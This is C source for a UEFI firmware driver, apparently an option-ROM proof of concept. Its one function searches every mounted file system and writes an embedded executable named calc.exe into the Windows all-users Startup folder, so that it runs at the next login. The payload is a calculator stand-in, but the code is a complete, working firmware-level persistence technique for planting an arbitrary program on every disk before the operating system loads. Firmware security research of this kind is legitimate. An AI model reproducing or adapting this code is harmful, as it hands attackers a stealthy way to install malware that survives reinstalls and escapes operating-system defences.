#include <Guid/FileInfo.h>
#include <IndustryStandard/Pci.h>
#include <Library/DebugLib.h>
#include <Library/MemoryAllocationLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/UefiDevicePathLib/UefiDevicePathLib.h>
#include <Library/UefiDriverEntryPoint.h>
#include <Library/UefiLib.h>
#include <Protocol/ComponentName.h>
#include <Protocol/ComponentName2.h>
#include <Protocol/DriverBinding.h>
#include <Protocol/PciIo.h>
#include <Protocol/SimpleFileSystem.h>
#include <Uefi.h>

#include "calc_exe.h"

void DumpCalcExe() {
  EFI_STATUS Status = EFI_SUCCESS;
  UINTN i;
  EFI_HANDLE *HandleBuffer = NULL;
  UINTN HandleCount;

  // Get the SimpleFileSystem handles avail
  Status =
      gBS->LocateHandleBuffer(ByProtocol, &gEfiSimpleFileSystemProtocolGuid,
                              NULL, &HandleCount, &HandleBuffer);

  if (!EFI_ERROR(Status)) {
#ifdef OPROM_DEBUG
    Print(L"Status %d\n HandleCount %llx", Status, HandleCount);
#endif
    // Loop over all the disks
    EFI_FILE_PROTOCOL *Fs = NULL;
    for (i = 0; i < HandleCount; i++) {
      EFI_SIMPLE_FILE_SYSTEM_PROTOCOL *SimpleFs = NULL;
      EFI_FILE_PROTOCOL *File = NULL;

      // Get protocol pointer for current volume
      Status = gBS->HandleProtocol(HandleBuffer[i],
                                   &gEfiSimpleFileSystemProtocolGuid,
                                   (VOID **)&SimpleFs);
      if (EFI_ERROR(Status)) {
#ifdef OPROM_DEBUG
        Print(L"FindWritableFs: gBS->HandleProtocol[%d] returned %r\n", i,
              Status);
#endif
        continue;
      }

      // Open the volume
      Status = SimpleFs->OpenVolume(SimpleFs, &Fs);
      if (EFI_ERROR(Status)) {
#ifdef OPROM_DEBUG
        Print(L"FindWritableFs: SimpleFs->OpenVolume[%d] returned %r\n", i,
              Status);
#endif
        continue;
      }

      // Try opening calc.exe file for writing
      Status = Fs->Open(
          Fs, &File,
          L"ProgramData\\Microsoft\\Windows\\Start "
          L"Menu\\Programs\\StartUp\\calc.exe",
          EFI_FILE_MODE_CREATE | EFI_FILE_MODE_READ | EFI_FILE_MODE_WRITE, 0);
      if (EFI_ERROR(Status)) {
#ifdef OPROM_DEBUG
        Print(L"FindWritableFs: Fs->Open[%d] returned %r\n", i, Status);
#endif
        continue;
      }

      UINTN bufSz = sizeof(calc_exe);
      Status = File->Write(File, &bufSz, calc_exe);

      if (EFI_ERROR(Status)) {
#ifdef OPROM_DEBUG
        Print(L"Error with file->write %r\n", Status);
#endif
      }
      File->Close(File);

      Status = EFI_SUCCESS;
    }
  }
}